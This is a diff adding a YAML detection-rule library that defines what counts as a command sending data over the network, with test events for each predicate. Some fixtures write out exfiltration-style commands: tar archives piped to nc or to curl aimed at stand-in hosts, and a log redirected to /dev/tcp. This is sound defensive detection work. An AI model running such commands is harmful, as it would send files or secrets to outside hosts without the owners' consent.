@@ -1,0 +1,140 @@
+# What it means for a command to send data over the network, said once for the egress rules.
+#
+# Eight rules ask it: secret-read-then-egress, browser-session-read-then-egress,
+# git-bundle-then-egress, secret-read-and-egress, env-dump-piped-to-network,
+# archive-then-upload, credentials-in-curl-data and upload-to-paste-transfer-site. Each says
+# what must be sent for it to matter; who sends is said here.
+#
+# The predicates over a command take one entry of e.command.parsed_commands, so they see a
+# sender by its name after sudo, env, timeout and the like, inside `bash -c`, and in any stage
+# of a pipeline, and do not see one named in a quoted string, a comment or a here-document.
+library: egress
+version: 1
+spec: threat-rules/v1.3
+description: A command that sends data over the network.
+
+definitions:
+  - name: egress_sender
+    params: [s]
+    description: >
+      A parsed command is a network client: curl, wget, HTTPie (http, https, httpie), xh, nc,
+      ncat, netcat or socat, by any path, or one of those run by a wrapper the parser did not
+      look through.
+    body: >
+      s.name.matches("(?i)(^|/)(curl|wget|http|https|httpie|xh|xhs|nc|ncat|netcat|socat)$") ||
+      s.name.matches("(?i)^(timeout|nice|ionice|stdbuf|doas|torsocks|proxychains4?)$") &&
+      s.argv.exists(a, a.matches("(?i)(^|/)(curl|wget|http|https|httpie|xh|xhs|nc|ncat|netcat|socat)$"))
+    tests:
+      - name: curl
+        match: e.command.parsed_commands.exists(s, egress_sender(s))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "curl -s https://example.com/health" }
+      - name: netcat_by_path_under_sudo_and_timeout
+        match: e.command.parsed_commands.exists(s, egress_sender(s))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sudo timeout 5 /usr/bin/nc host.example 4444" }
+      - name: wget_inside_a_shell_script
+        match: e.command.parsed_commands.exists(s, egress_sender(s))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "bash -c 'wget -q https://example.com/x'" }
+      - name: sender_named_in_a_commit_message
+        match: e.command.parsed_commands.exists(s, egress_sender(s))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git commit -m 'retry curl on failure'" }
+      - name: sender_named_after_echo
+        match: e.command.parsed_commands.exists(s, egress_sender(s))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo curl https://example.com" }
+
+  - name: egress_reads_stdin
+    params: [s]
+    description: >
+      A sender sends what is piped or redirected into it. nc, ncat, netcat, socat and HTTPie
+      do; curl and wget only with a body that is standard input (@-, -T -, --post-file=-).
+    body: >
+      !s.argv.exists(a, a.matches("(?i)(^|/)(curl|wget)$")) ||
+      s.argv.exists(a, a.matches("^.*[=@<](-|/dev/stdin)$")) ||
+      s.argv.exists(a, a.matches("^(-[a-zA-Z]*T|--upload-file|--post-file|--body-file)$")) &&
+      s.argv.exists(a, a in ["-", "/dev/stdin"])
+    tests:
+      - name: pipe_into_netcat
+        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "tar czf - src | nc host.example 4444" }
+      - name: pipe_into_curl_with_a_stdin_body
+        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "tar czf - src | curl --data-binary @- https://drop.example" }
+      - name: pipe_into_curl_upload_of_stdin
+        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "tar czf - src | curl -T - https://drop.example" }
+      - name: pipe_into_a_curl_that_sends_no_body
+        match: e.command.parsed_commands.exists(s, egress_sender(s) && egress_reads_stdin(s))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "tar czf - src | curl -s https://example.com/health" }
+
+  - name: egress_remote_copy
+    params: [s]
+    description: >
+      A parsed command is scp, sftp or rsync with an operand on another host (host:path,
+      user@host:path).
+    body: >
+      s.name.matches("(?i)^(scp|sftp|rsync)$") && s.argv_raw.exists(a, a.matches("^[\\x27\"]?[\\w.@-]+:"))
+    tests:
+      - name: scp_to_a_host
+        match: e.command.parsed_commands.exists(s, egress_remote_copy(s))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp build.tgz deploy@host.example:/srv/" }
+      - name: rsync_between_local_directories
+        match: e.command.parsed_commands.exists(s, egress_remote_copy(s))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -av build/ /srv/build/" }
+
+  - name: egress_dev_tcp
+    params: [e]
+    description: >
+      The command line redirects to or from bash's /dev/tcp or /dev/udp, and the path is not a
+      word of a command that is not a shell (a commit message, an echo argument).
+    body: >
+      e.command.command.matches("[<>][&|]?\\s*/dev/(tcp|udp)/") &&
+      !e.command.parsed_commands.exists(w, !w.name.matches("(?i)^(ba|z|da|k)?sh$") &&
+        w.argv_raw.exists(a, a.matches("/dev/(tcp|udp)/")))
+    tests:
+      - name: redirect_to_a_socket
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat build.log > /dev/tcp/host.example/4444" }
+      - name: redirect_inside_a_shell_script
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "bash -c 'cat build.log > /dev/tcp/host.example/4444'" }
+      - name: redirect_written_in_an_echo_argument
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo 'cat x > /dev/tcp/host.example/4444' >> notes.md" }
